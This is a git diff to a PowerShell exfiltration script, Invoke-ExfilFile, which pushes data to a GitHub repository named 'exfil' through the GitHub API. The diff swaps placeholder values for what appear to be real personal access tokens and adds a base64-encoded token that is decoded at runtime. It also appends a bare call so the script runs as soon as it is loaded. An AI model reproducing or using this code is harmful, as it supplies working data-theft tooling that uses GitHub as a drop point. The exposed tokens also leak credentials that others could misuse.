@@ -39,7 +39,7 @@ Data to write to file
 
 
 .EXAMPLE
-Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "xxxxxxxxxxxxxxxxxxxxxxx" -GHFilePath "testfolder/" -GHFileName "testfile3" -data "a bit of test data"
+Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "6ad6248b0c3e98ba430a07a2379e49855b56e6c2" -GHFilePath "testfolder/" -GHFileName "testfile3" -data "a bit of test data"
 
 #>
 
@@ -56,16 +56,17 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "xxxxxxxxxxxxxxxxxxxxxxx" -
 
         [Parameter(Position = 2, Mandatory = $False)]
         [String]
-        #$GHPAT = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-        $GHPAT = "325e15bcc471887d08651a2a4e1cd1a87b76314e",
+        #$GHPAT = "325e15bcc471887d08651a2a4e1cd1a87b76314e",
+        #$GHPAT = "6ad6248b0c3e98ba430a07a2379e49855b56e6c2",
+        $GHPAT = "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZDA0YQ==", # This should be base 64 encoded
 
         [Parameter(Position =3, Mandatory = $False)]
         [String]
-        $GHFilePath = "testfolder5/",
+        $GHFilePath = "testfolder2/",
 
         [Parameter(Position = 4, Mandatory = $False)]
         [String]
-        $GHFileName = "testfile5",
+        $GHFileName = "testfile1",
 
         [Parameter(Position = 5, Mandatory = $False)]
         [String]
@@ -76,8 +77,11 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "xxxxxxxxxxxxxxxxxxxxxxx" -
 
 
     # This is the GitHub username and Personal Access Token 
-    #$Token = 'nnh100:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
-    #$Token = 'nnh100:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+    #$Token = 'nnh100:eb1d2888bed6b7c01fef32ea0ce8fe5b13e4dc39'
+    #$Token = 'nnh100:325e15bcc471887d08651a2a4e1cd1a87b76314e'
+
+    $GHPAT = [System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String($GHPAT)))
+
     $Token = $GHUser + ":" + $GHPAT
 
 
@@ -156,7 +160,7 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "xxxxxxxxxxxxxxxxxxxxxxx" -
 
 }
 
-
+Invoke-ExfilFile
 
 
 
